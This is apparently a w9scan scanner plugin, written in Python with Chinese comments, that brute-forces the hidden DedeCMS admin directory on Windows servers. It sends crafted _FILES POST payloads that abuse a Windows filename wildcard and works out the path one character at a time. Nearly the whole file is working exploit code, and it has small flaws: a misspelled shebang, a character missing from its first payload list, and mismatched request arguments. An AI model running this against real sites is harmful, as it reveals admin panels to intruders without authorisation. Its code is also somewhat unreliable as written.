#!/usr/bin/evn python
# -*- coding: utf-8 -*-
# author:w8ay
# w9scan扫描器
# 仅支持windows系统 寻找DEDE后台

characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
profix = ""
char_num = len(characters)

def assign(service, arg):
    if service == "dedecms":
        return True, arg

# 找到前缀
def findpre(temurl):
    global profix
    # combine the payload
    payload = list()
    for i in ['a','b','c','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','!','#']:
        payload.append(i)
    for i in range(char_num):
        payload.append('d' + characters[i])

    for p in payload:
        data = "_FILES[mochazz][tmp_name]=./{p}</images/adminico.gif&_FILES[mochazz][name]=0&_FILES[mochazz][size]=0&_FILES[mochazz][type]=image/gif".replace("{p}",p)

        code, head, body, redirect, log = hackhttp.http(temurl,post=data)
        if code == 404:
            return False
        if "Upload filetype not allow !" not in body and code == 200:
            profix = p
            findAllPath(temurl)
            break
    return profix

def findAllPath(temurl):
    global profix
    for i in range(char_num):
        ch = profix + characters[i]
        data = "_FILES[mochazz][tmp_name]=./{p}</images/adminico.gif&_FILES[mochazz][name]=0&_FILES[mochazz][size]=0&_FILES[mochazz][type]=image/gif".replace(
            "{p}", ch)
        code, head, body, redirect, log = hackhttp.http(temurl,data=data)
        if "Upload filetype not allow !" not in body and code == 200:
            profix = ch
            findAllPath(temurl)
            break

def audit(arg):
    # 判断是否是Windows
    temurl = arg + "/"
    code, head, body, redirect, log = hackhttp.http(temurl)
    
    if code == 404:
        return
    # 开始寻找
    temurl = arg + "tags.php"
    code, head, body, redirect, log = hackhttp.http(temurl)
    
    if code == 404:
        temurl = arg + "index.php"
    ff = findpre(temurl)
    if ff:
        security_warning(arg + ff,"DeDeCMS Admin Router")
    else:
        security_note("存在后台泄露 refer:https://xz.aliyun.com/t/2064","DeDeCMS Admin Router")

if __name__ == "__main__":
    from dummy import *

    audit("http://127.0.0.1/dedecms/")

